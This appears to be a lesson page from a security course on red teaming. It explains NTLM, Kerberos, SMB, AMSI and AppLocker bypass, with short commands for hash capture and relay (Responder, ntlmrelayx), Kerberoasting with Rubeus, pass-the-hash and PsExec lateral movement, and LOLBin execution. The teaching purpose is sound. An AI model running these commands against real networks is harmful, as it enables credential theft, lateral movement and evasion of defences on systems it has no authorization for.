---
title: "Red Teaming"
topic: "red-teaming"
tags: [red-team, ntlm, kerberos, smb, amsi, bypass, active-directory, evasion]
difficulty: advanced
day: 59
layout: default
parent: Topics
nav_order: 59
---

# Red Teaming

## What You Will Learn
- What a red team engagement is and how it differs from a pentest
- How NTLM, Kerberos, and SMB are abused in real attacks
- What AMSI is and how it blocks malicious scripts
- How application control restrictions are bypassed

## What Is It?

**Red teaming** is a full-scope adversary simulation. Unlike a penetration test that finds and reports vulnerabilities, a red team engagement simulates a real attacker — using stealth, persistence, and multi-stage techniques to achieve a specific objective (e.g., access the CEO's email, extract customer data).

Red teams use the same TTPs (Tactics, Techniques, and Procedures) as real threat actors.

## Why It Matters

Red teaming reveals how an organization responds to a real attack — not just whether vulnerabilities exist, but whether they would be detected and contained. It tests people, processes, and technology together.

## Key Concepts

## NTLM

**NT LAN Manager (NTLM)** is a Windows challenge-response authentication protocol. The password is never sent — instead, the server sends a challenge and the client signs it with the NT hash.

**Common NTLM attacks:**
- **Pass-the-Hash**: Use a captured NTLM hash without cracking it
- **NTLM Relay**: Capture a hash and relay it to authenticate elsewhere
- **NTLM Cracking**: Crack captured hashes offline

```bash
# Capture NTLM hashes with Responder
responder -I eth0 -rdw

# Relay hashes to SMB
ntlmrelayx.py -tf targets.txt -smb2support

# Crack NTLM hash
hashcat -m 5600 hashes.txt wordlist.txt
```

## Kerberos

**Kerberos** is the default authentication protocol for Active Directory. It uses tickets instead of password hashes.

**Common Kerberos attacks:**
- **Kerberoasting**: Request service tickets and crack them offline
- **AS-REP Roasting**: Get a hash for accounts without pre-auth enabled
- **Pass-the-Ticket**: Reuse stolen Kerberos tickets
- **Golden/Silver Ticket**: Forge tickets using the KRBTGT hash

```bash
# Kerberoasting with Rubeus
Rubeus.exe kerberoast /outfile:hashes.txt

# AS-REP Roasting
Rubeus.exe asreproast /outfile:asrep_hashes.txt

# Crack the hashes
hashcat -m 13100 hashes.txt wordlist.txt  # Kerberoast
hashcat -m 18200 asrep_hashes.txt wordlist.txt  # AS-REP
```

## SMB

**Server Message Block (SMB)** is used for file sharing and lateral movement. It runs on port 445.

```bash
# List shares
smbclient -L //target -U user

# Connect to a share
smbclient //target/C$ -U administrator

# Lateral movement with PsExec
psexec.py domain/user:password@target cmd.exe

# Pass-the-Hash via SMB
pth-smbclient //target/C$ -U administrator%aad3b435b51404eeaad3b435b51404ee:NTLM_HASH
```

## AMSI

**AMSI (Antimalware Scan Interface)** is integrated into Windows 10+ components to scan scripts and code for malware before execution. It hooks into:

- PowerShell (scripts, interactive use, dynamic code evaluation)
- Windows Script Host (wscript.exe, cscript.exe)
- JavaScript and VBScript
- Office VBA macros
- User Account Control (UAC elevation)

AMSI sends the script content to the registered antivirus engine. If it is flagged, execution is blocked.

**AMSI Bypass Techniques** (for authorized red teams):
- Patching the AMSI `ScanBuffer` function in memory
- Obfuscating scripts so they are not recognized by signatures
- Using encrypted payloads that decrypt at runtime

```powershell
# Basic AMSI test (will be blocked by AMSI)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils') | ...
```

## Application Restriction Bypass

Windows AppLocker and WDAC restrict which applications can run. Attackers bypass this using trusted binaries (LOLBins):

```cmd
# Use InstallUtil to run code
C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U script.exe

# Use MSBuild to run inline tasks
msbuild.exe malicious.csproj

# Other LOLBins: regsvr32, rundll32, wmic, regasm
```

Reference: [LOLBAS Project](https://lolbas-project.github.io/)

## Resources

- [MITRE ATT&CK Framework](https://attack.mitre.org/)
- [Red Team Development and Operations Guide](https://redteam.guide/)
- [TryHackMe — Red Team Path](https://tryhackme.com/paths)
- [HackTricks — Active Directory Attacks](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology)
- [Cobalt Strike — Official Red Team Tool](https://www.cobaltstrike.com/)
